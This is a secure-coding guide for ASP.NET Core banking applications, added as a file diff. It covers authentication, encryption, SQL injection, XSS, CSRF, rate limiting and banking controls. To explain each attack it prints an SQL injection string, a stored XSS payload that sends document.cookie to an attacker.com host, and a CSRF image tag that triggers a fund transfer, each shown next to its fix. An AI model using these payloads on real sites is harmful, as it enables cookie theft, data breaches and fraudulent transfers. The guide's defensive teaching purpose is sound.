@@ -1,0 +1,428 @@
+1. Authentication & Authorization (Foundation)
+✅ Use Identity + Token-based auth
+Implement ASP.NET Core Identity
+Use OAuth 2.0 + OpenID Connect
+Recommended setup:
+JWT Access Tokens (short-lived)
+Refresh Tokens (stored securely in DB)
+Role-based + Policy-based authorization
+services.AddAuthentication("Bearer")
+.AddJwtBearer(options =>
+{
+    options.TokenValidationParameters = new TokenValidationParameters
+    {
+        ValidateIssuer = true,
+        ValidateAudience = true,
+        ValidateLifetime = true,
+        ValidateIssuerSigningKey = true
+    };
+});
+
+👉 Banking tip:
+Use Multi-Factor Authentication (MFA) (OTP via SMS/Authenticator apps)
+
+🔒 2. Data Protection (Critical for Banking)
+✅ Encrypt sensitive data
+
+Use ASP.NET Core Data Protection
+
+Encrypt:
+Account numbers
+Aadhaar/PAN
+Transaction details
+var protector = _dataProtectionProvider.CreateProtector("BankApp");
+var encrypted = protector.Protect("1234567890");
+✅ Hash passwords properly
+Use bcrypt (built-in in Identity)
+Never store plain passwords
+🌐 3. Secure Communication
+✅ Enforce HTTPS everywhere
+Redirect HTTP → HTTPS
+Use strong TLS (1.2+)
+app.UseHttpsRedirection();
+
+👉 Add HSTS
+
+app.UseHsts();
+
+##################################################################################################################
+🛡️ 4. Prevent Common Attacks
+
+a) SQL Injection
+Always use parameterized queries or EF Core
+var user = await _context.Users
+    .Where(u => u.Email == email)
+    .FirstOrDefaultAsync();
+	
+🔴 1. What is SQL Injection?
+
+It happens when user input is directly concatenated into SQL queries.
+
+❌ Vulnerable code (DO NOT DO THIS)
+
+var query = "SELECT * FROM Users WHERE Email = '" + email + "'";
+
+If attacker enters: test@example.com' OR '1'='1
+
+Final query becomes: SELECT * FROM Users WHERE Email = 'test@example.com' OR '1'='1'
+
+👉 This returns all users → serious breach in banking apps.
+------------------------------------------------------------------------------------------------------
+
+🟢 2. Parameterized Queries (Safe Way)
+✅ Using ADO.NET (Safe)
+var query = "SELECT * FROM Users WHERE Email = @Email";
+
+using (var cmd = new SqlCommand(query, connection))
+{
+    cmd.Parameters.AddWithValue("@Email", email);
+
+    var reader = cmd.ExecuteReader();
+}
+✔ Why this is safe:
+SQL and data are separated
+Input is treated as value, not executable SQL
+------------------------------------------------------------------------------------------------------
+
+🟢 3. Using Entity Framework Core (Best Practice)
+
+With Entity Framework Core, queries are automatically parameterized.
+
+✅ Example:
+var user = await _context.Users
+    .FirstOrDefaultAsync(u => u.Email == email);
+
+👉 EF Core converts this internally to:
+
+SELECT * FROM Users WHERE Email = @p0
+
+So even if input is malicious, it won’t break the query.
+
+------------------------------------------------------------------------------------------------------
+⚠️ 4. Dangerous EF Core Usage (People still get this wrong)
+❌ Raw SQL with string concatenation
+var users = _context.Users
+    .FromSqlRaw("SELECT * FROM Users WHERE Email = '" + email + "'")
+    .ToList();
+
+👉 This is STILL vulnerable.
+
+✅ Safe Raw SQL
+var users = _context.Users
+    .FromSqlRaw("SELECT * FROM Users WHERE Email = @email",
+        new SqlParameter("@email", email))
+    .ToList();
+------------------------------------------------------------------------------------------------------
+🔐 5. Stored Procedures (Safe if used properly)
+
+var cmd = new SqlCommand("GetUserByEmail", connection);
+cmd.CommandType = CommandType.StoredProcedure;
+cmd.Parameters.AddWithValue("@Email", email);
+
+👉 Still safe because parameters are used.
+------------------------------------------------------------------------------------------------------
+
+
+b) XSS (Cross-Site Scripting)
+Razor auto-encodes output
+For APIs → validate & sanitize input
+
+🔴 1. What is XSS?
+
+XSS happens when malicious JavaScript is injected into your web page and executed in another user’s browser.
+
+Example attack input:
+<script>alert('Hacked')</script>
+
+If your app renders this without protection → script executes.
+------------------------------------------------------------------------------------------------------
+
+🧠 2. Types of XSS (Important for interviews + real systems)
+
+1. Stored XSS
+Malicious script is stored in DB
+Example: comment box in banking portal
+<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
+
+👉 Every user viewing it gets attacked.
+
+2. Reflected XSS
+Script comes from URL/query string
+https://bank.com/search?q=<script>alert(1)</script>
+
+3. DOM-Based XSS
+Happens in frontend (React/JS)
+element.innerHTML = userInput;
+
+------------------------------------------------------------------------------------------------------
+
+3. Vulnerable Example (.NET + Razor)
+<div>
+    @Html.Raw(userInput)
+</div>
+
+👉 This renders raw HTML → dangerous.
+
+------------------------------------------------------------------------------------------------------
+
+🟢 4. Safe by Default in ASP.NET Core
+
+Good news: Razor automatically encodes output.
+
+✅ Safe code:
+<div>
+    @userInput
+</div>
+
+👉 Converts:
+
+<script>alert(1)</script>
+
+Into:
+
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+So browser shows text, not execute script.
+------------------------------------------------------------------------------------------------------
+
+🛡️ 7. How to Prevent XSS (Practical)
+
+✅ 1. Output Encoding (MOST IMPORTANT)
+Razor does this automatically
+Never use Html.Raw unless absolutely necessary
+✅ 2. Input Validation
+
+Reject suspicious input:
+
+if (userInput.Contains("<script>"))
+{
+    throw new Exception("Invalid input");
+}
+
+👉 Not sufficient alone, but adds protection.
+
+✅ 3. Use Content Security Policy (CSP)
+
+Add HTTP header:
+
+app.Use(async (context, next) =>
+{
+    context.Response.Headers.Add("Content-Security-Policy",
+        "default-src 'self'; script-src 'self'");
+    await next();
+});
+
+👉 Blocks inline scripts
+
+✅ 4. Secure Cookies
+options.Cookie.HttpOnly = true;
+options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+
+👉 Prevent JS from accessing cookies
+
+✅ 5. Sanitize HTML (if needed)
+
+If you must allow HTML (rich text):
+
+Use libraries like:
+
+HTML sanitizer
+✅ 6. Avoid Inline JavaScript
+
+❌ Bad:
+
+<button onclick="doSomething()">Click</button>
+
+------------------------------------------------------------------------------------------------------
+c) CSRF
+Use Anti-forgery tokens
+[ValidateAntiForgeryToken]
+
+
+CSRF (Cross-Site Request Forgery) is a web security vulnerability where a malicious website tricks a user’s browser into performing 
+unwanted actions on another trusted site where the user is already authenticated.
+
+🔴 Simple Example (Banking Scenario)
+
+Imagine:
+
+You are logged into your bank (bank.com)
+Your session is active (cookie stored in browser)
+
+Now you visit a malicious site. That site silently runs:
+
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
+
+👉 Your browser automatically sends the request with your session cookie
+👉 The bank thinks YOU made the request
+👉 Money gets transferred ❌
+
+🔍 Why CSRF Happens
+Web apps rely on cookies for authentication
+Browsers automatically attach cookies to requests
+
+Server cannot distinguish between:
+Legitimate request
+Malicious request from another site
+
+🧠 Key Concept: CSRF = “User is tricked to perform an action without their consent”
+
+------------------------------------------------------------------------------------------------------
+
+🛡️ How to Prevent CSRF (Important for .NET Core)
+1. Anti-CSRF Token (Most Important ✅)
+
+Server generates a unique token and validates it.
+
+Example in ASP.NET Core:
+[HttpPost]
+[ValidateAntiForgeryToken]
+public IActionResult TransferMoney(TransferModel model)
+{
+    // secure logic
+}
+
+In Razor View:
+
+<form method="post">
+    @Html.AntiForgeryToken()
+</form>
+
+👉 Token must match → request is valid
+👉 If attacker sends request → token missing/invalid ❌
+
+------------------------------------------------------------------------------------------------------
+
+2. SameSite Cookies
+
+Prevent cookies from being sent in cross-site requests.
+
+services.ConfigureApplicationCookie(options =>
+{
+    options.Cookie.SameSite = SameSiteMode.Strict;
+});
+
+Types:
+
+Strict → safest
+Lax → balanced (recommended)
+None → allows cross-site (use with HTTPS only)
+
+3. Use POST Instead of GET
+
+❌ Bad:
+
+GET /transfer?amount=1000
+
+✅ Good:
+
+POST /transfer
+
+👉 GET requests are easier to exploit via CSRF
+
+4. Custom Headers (for APIs / AJAX)
+
+CSRF attacks cannot easily send custom headers.
+
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-TOKEN': token
+  }
+});
+5. Check Referer / Origin Header (Additional layer)
+
+Server validates request origin:
+
+if (Request.Headers["Origin"] != "https://yourdomain.com")
+{
+    return Unauthorized();
+}
+
+------------------------------------------------------------------------------------------------------
+d) Rate Limiting (VERY IMPORTANT for banking)
+
+Prevent brute-force & DDoS:
+
+services.AddRateLimiter(options =>
+{
+    options.AddFixedWindowLimiter("api", opt =>
+    {
+        opt.PermitLimit = 100;
+        opt.Window = TimeSpan.FromMinutes(1);
+    });
+});
+
+##################################################################################################################
+
+🔐 5. API Security (For React + .NET setup)
+
+Since you're using React:
+
+a) Secure APIs
+Use JWT in Authorization header
+Validate tokens on every request
+Authorization: Bearer <token>
+
+##################################################################################################################
+b) CORS Configuration
+
+services.AddCors(options =>
+{
+    options.AddPolicy("SecurePolicy",
+        builder => builder
+            .WithOrigins("https://yourfrontend.com")
+            .AllowAnyHeader()
+            .AllowAnyMethod());
+});
+
+##################################################################################################################
+
+🧾 6. Logging & Monitoring
+✅ Use structured logging
+Use Serilog
+
+Log:
+
+Login attempts
+Failed transactions
+Suspicious activity
+
+👉 Never log:
+
+Passwords
+Full account numbers
+
+##################################################################################################################
+🔍 7. Secure Session & Cookies
+services.ConfigureApplicationCookie(options =>
+{
+    options.Cookie.HttpOnly = true;
+    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+    options.Cookie.SameSite = SameSiteMode.Strict;
+});
+
+##################################################################################################################
+🔐 8. Secrets Management
+❌ Don’t store secrets in appsettings.json
+✅ Use:
+Azure Key Vault
+Environment variables
+
+##################################################################################################################
+🏦 9. Banking-Specific Controls (Important)
+✅ Transaction Security
+OTP for every fund transfer
+Transaction signing (hash + timestamp)
+✅ Account Lockout
+options.Lockout.MaxFailedAccessAttempts = 5;
+✅ Audit Trails
+Every transaction must be traceable
+🧪 10. Security Testing
+Penetration testing
+Vulnerability scanning
+Tools:
+OWASP ZAP
+Burp Suite
+
+Follow OWASP Top 10
